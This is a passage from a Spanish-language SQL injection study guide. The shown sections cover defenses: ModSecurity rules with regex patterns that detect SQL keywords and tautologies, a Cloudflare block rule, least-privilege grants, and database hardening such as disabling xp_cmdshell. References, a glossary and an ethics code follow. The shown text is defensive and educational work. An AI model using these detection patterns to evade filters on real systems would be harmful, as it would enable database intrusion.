    "id:1002,phase:2,block,msg:'SQL Injection - Comment detected'"

# Detectar palabras clave SQL
SecRule ARGS "@rx (?i)(select|insert|update|delete|drop|create|alter)" \
    "id:1003,phase:2,block,msg:'SQL Injection - SQL keyword detected'"

# Detectar tautologías
SecRule ARGS "@rx (?i)(or|and)\s+[\w\d]+\s*=\s*[\w\d]+" \
    "id:1004,phase:2,block,msg:'SQL Injection - Tautology detected'"
```

**Cloudflare WAF:**
```
Managed Rules → OWASP Core Ruleset → Enable
Custom Rules → Expression: http.request.uri contains "UNION" → Block
```

---

### 9.6 Principio de Mínimos Privilegios

```sql
-- Usuario con TODO (INCORRECTO)
GRANT ALL PRIVILEGES ON *.* TO 'webapp'@'localhost';

-- Usuario con permisos mínimos (CORRECTO)
CREATE USER 'webapp_reader'@'localhost' IDENTIFIED BY 'password';
GRANT SELECT ON database.products TO 'webapp_reader'@'localhost';
GRANT SELECT, INSERT, UPDATE ON database.orders TO 'webapp_reader'@'localhost';

-- Denegar operaciones peligrosas
REVOKE DROP, CREATE, ALTER, GRANT ON database.* FROM 'webapp_reader'@'localhost';

-- Usuario admin separado (solo para mantenimiento)
CREATE USER 'webapp_admin'@'localhost' IDENTIFIED BY 'strong_password';
GRANT ALL PRIVILEGES ON database.* TO 'webapp_admin'@'localhost';
```

---

### 9.7 Configuración Segura de Base de Datos

**MySQL:**
```sql
-- Desactivar LOAD DATA INFILE
SET GLOBAL local_infile = 0;

-- Desactivar FILE privilege
REVOKE FILE ON *.* FROM 'webapp'@'localhost';

-- Limitar query time
SET GLOBAL max_execution_time = 5000;  -- 5 segundos
```

**PostgreSQL:**
```sql
-- Limitar conexiones por usuario
ALTER USER webapp CONNECTION LIMIT 50;

-- Desactivar superuser
ALTER USER webapp WITH NOSUPERUSER;
```

**MSSQL:**
```sql
-- Desactivar xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 0;
RECONFIGURE;

-- Limitar permisos
DENY EXECUTE ON xp_cmdshell TO webapp;
```

---

## 10. REFERENCIAS

### 10.1 Documentación Oficial

**OWASP:**
- SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- ASVS V5: https://github.com/OWASP/ASVS

**CWE:**
- CWE-89: https://cwe.mitre.org/data/definitions/89.html

**NIST:**
- SP 800-53 Rev. 5: https://csrc.nist.gov/publications/detail/sp/800-53/rev-5/final

**PortSwigger:**
- SQL Injection Cheat Sheet: https://portswigger.net/web-security/sql-injection/cheat-sheet
- Web Security Academy: https://portswigger.net/web-security

---

### 10.2 Herramientas

**Testing:**
- SQLMap: https://sqlmap.org/
- Burp Suite: https://portswigger.net/burp
- OWASP ZAP: https://www.zaproxy.org/

**Defensa:**
- ModSecurity: https://github.com/SpiderLabs/ModSecurity
- OWASP Core Rule Set: https://coreruleset.org/

**Aprendizaje:**
- PortSwigger Web Security Academy: https://portswigger.net/web-security
- DVWA: https://github.com/digininja/DVWA
- bWAPP: http://www.itsecgames.com/

---

### 10.3 Libros Recomendados

- "The Web Application Hacker's Handbook" - Dafydd Stuttard & Marcus Pinto
- "SQL Injection Attacks and Defense" - Justin Clarke
- "OWASP Testing Guide v4" - OWASP Foundation

---

### 10.4 Certificaciones

- OSCP (Offensive Security Certified Professional)
- CEH (Certified Ethical Hacker)
- GWAPT (GIAC Web Application Penetration Tester)
- eWPT (eLearnSecurity Web Application Penetration Tester)

---

## ANEXO A: Glosario

**SQL Injection (SQLi):** Vulnerabilidad que permite a un atacante interferir con consultas SQL.

**UNION Attack:** Técnica que usa el operador UNION para combinar resultados de múltiples queries.

**Prepared Statement:** Consulta SQL parametrizada que separa código de datos.

**ORM:** Object-Relational Mapping, abstracción que traduce código a SQL seguro.

**WAF:** Web Application Firewall, filtro de tráfico HTTP.

**information_schema:** Esquema SQL estándar que contiene metadata de la base de datos.

**Blind SQLi:** SQL Injection donde no se ve output directo, se infiere por comportamiento.

**Time-based SQLi:** Técnica que usa delays para inferir información.

**Error-based SQLi:** Técnica que provoca errores SQL para extraer información.

**DBMS:** Database Management System (MySQL, Oracle, PostgreSQL, MSSQL).

---

## ANEXO B: Código de Conducta Ética

**Este conocimiento es para:**
- Testing autorizado en entornos propios
- Bug bounty programs legítimos
- Educación y capacitación profesional
- Mejora de la seguridad con permiso explícito

**NO usar para:**
- Acceso no autorizado a sistemas
- Robo de datos
- Daño a infraestructura
- Cualquier actividad ilegal

**Responsabilidad legal:**
El uso no autorizado de estas técnicas puede constituir delito bajo:
- Computer Fraud and Abuse Act (CFAA) - USA
- Computer Misuse Act - UK
- Artículo 197 bis Código Penal - España
- Leyes equivalentes en tu jurisdicción

**Siempre obtener autorización escrita antes de realizar pentesting.**

---

## CHANGELOG

**v1.0 - 2025-11-20**
- Versión inicial
- 9 labs de PortSwigger documentados
- Metodología completa de explotación
- Comandos base de explotación
- Perspectiva QA y contramedidas

---

**FIN DEL DOCUMENTO**

---

**Autor:** Sr. Arévalo  
**Contacto:** [Tu email o GitHub]  
**Licencia:** Este documento es para uso educativo. Prohibida su distribución sin autorización.  
**Última actualización:** Noviembre 2025
